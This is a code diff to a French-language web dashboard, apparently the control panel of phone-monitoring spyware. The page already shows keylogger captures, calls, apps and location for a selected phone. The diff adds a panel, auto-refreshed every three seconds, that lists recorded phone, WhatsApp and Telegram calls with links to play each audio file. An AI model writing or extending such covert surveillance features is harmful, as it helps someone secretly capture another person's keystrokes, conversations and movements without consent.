@@ -442,6 +442,41 @@
                             </div>
                         </div>
                         <div class="card mb-3 shadow-md">
+                            <div class="card-header ">
+                                <div class="d-flex flex-wrap justify-content-between align-items-center">
+                                    <h4 class="font-weight-bold"> <i class="fa fa-microphone"></i> Enregistrement d'appels
+                                    </h4>
+                                    <div class="d-flex flex-column flex-sm-row flex-wrap">
+                                        <div class="mb-2 mb-sm-0 mr-sm-2">
+                                            <span>Date</span>
+                                            <input type="text" class="form-control form-control-sm flatpicker input"
+                                                id="callrecorderdate" value="{{ date('Y-m-d') }}">
+                                        </div>
+                                    </div>
+                                </div>
+                                <p class="text-muted mb-2">
+                                    <i class="fa fa-info-circle"></i>
+                                    L'historique de tous les appels Téléphoniques, Whatsapp et Télégram
+                                </p>
+                            </div>
+                            <div class="card-body">
+                                <div class="table-responsive">
+                                    <x-error />
+                                    <table taudio class="table table-sm table-condensed table-hover table-striped"
+                                        style="width: 100%">
+                                        <thead>
+                                            <th>ID</th>
+                                            <th>Source</th>
+                                            <th>Fichier</th>
+                                            <th>Enregistrement</th>
+                                            <th>Date</th>
+                                        </thead>
+                                        <tbody></tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card mb-3 shadow-md">
                             <div class="card-header">
                                 <h4 class="font-weight-bold"> <i class="fa fa-list-ul"></i> Apps</h4>
                                 <p class="text-muted mb-2">
@@ -473,7 +508,7 @@
                                     <div class="d-flex flex-column flex-sm-row flex-wrap">
                                         <div class="mb-2 mb-sm-0 mr-sm-2">
                                             <span>Date</span>
-                                            <input type="text" class="form-control form-control-sm flatpicker input"
+                                            <input type="text" class="form-control form-control-sm input"
                                                 id="locationdate" value="{{ date('Y-m-d') }}">
                                         </div>
                                     </div>
@@ -926,6 +961,15 @@
                         firstDayOfWeek: 1
                     }
                 });
+
+                flatpickr("#locationdate", {
+                    minDate: mindate,
+                    maxDate: "today",
+                    locale: {
+                        firstDayOfWeek: 1
+                    }
+                });
+
                 $('.select2').select2({
                     minimumResultsForSearch: Infinity
                 });
@@ -944,6 +988,11 @@
                 var calldate = $('#calldate');
                 calldate.change(function() {
                     dtCalls.ajax.reload(null, false);
+                });
+
+                var callrecorderdate = $('#callrecorderdate');
+                callrecorderdate.change(function() {
+                    dtAudio.ajax.reload(null, false);
                 });
 
                 var locationdate = $('#locationdate');
@@ -972,6 +1021,7 @@
                     dtKeylogger.ajax.reload(null, false);
                     dtCalls.ajax.reload(null, false);
                     dtApps.ajax.reload(null, false);
+                    dtAudio.ajax.reload(null, false);
                 }
 
                 function phoneStatus(phone) {
@@ -1118,13 +1168,18 @@
                         }
                     },
                     drawCallback: function() {
+                        $('[blanklink]').off('click').click(function() {
+                            var btn = $(this);
+                            var link = btn.data('link');
+                            window.open(link, '_blank');
+                        });
+
                         $('[btncontact]').off('click').click(function() {
                             var btn = $(this);
                             var data = [];
                             try {
                                 var d = btn.attr('data');
                                 data = JSON.parse(d);
-                                console.log(data);
                             } catch (error) {}
                             $('[ccmpt]').html(data.length);
                             var h = '';
@@ -1375,6 +1430,70 @@
                     ]
                 }));
 
+                /////////////
+                var dtAudio = (new DataTable('[taudio]', {
+                    searching: false,
+                    lengthMenu: [
+                        [10, 25, 50, 100, -1],
+                        [10, 25, 50, 100, "All"]
+                    ],
+                    processing: true,
+                    serverSide: true,
+                    ajax: {
+                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
+                        data: function(data) {
+                            data.type = "callrecorder";
+                            data.phone_id = phonesel.val();
+                            data.callrecorderdate = callrecorderdate.val();
+                        }
+                    },
+                    drawCallback: function() {
+                        $('[blanklink]').off('click').click(function() {
+                            var btn = $(this);
+                            var link = btn.data('link');
+                            window.open(link, '_blank');
+                        });
+                    },
+                    order: [
+                        [0, "desc"]
+                    ],
+                    columnDefs: [{
+                            targets: 0,
+                            width: '1%'
+                        },
+                        {
+                            targets: 4,
+                            width: '1%'
+                        },
+                    ],
+                    columns: [{
+                            data: 'id',
+                            name: 'id'
+                        },
+                        {
+                            data: 'source',
+                            name: 'source',
+                        },
+                        {
+                            data: 'file',
+                            name: 'file',
+                            searchable: false,
+                            orderable: false,
+                        },
+                        {
+                            data: 'path',
+                            name: 'path',
+                            searchable: false,
+                            orderable: false,
+                        },
+                        {
+                            data: 'date',
+                            name: 'date',
+                            class: 'text-nowrap'
+                        },
+                    ]
+                }));
+
 
                 /////////////
                 var dtApps = (new DataTable('[tapps]', {
@@ -1528,6 +1647,24 @@
 
                         processingEl.css('visibility', 'visible');
                         isDtAppsInprogress = false;
+                    }, 3000);
+
+                    let isDtAudioInprogress = false;
+                    setInterval(async () => {
+                        if (isDtAudioInprogress) return;
+                        isDtAudioInprogress = true;
+                        var e = $('[taudio]').closest('.dataTables_wrapper').find(
+                            '.dataTables_processing');
+                        e.css('visibility', 'hidden');
+                        try {
+                            await new Promise((resolve, reject) => {
+                                dtAudio.ajax.reload(function(json) {
+                                    resolve(json);
+                                }, false);
+                            });
+                        } catch (error) {}
+                        isDtAudioInprogress = false;
+                        e.css('visibility', 'visible');
                     }, 3000);
 
                 }
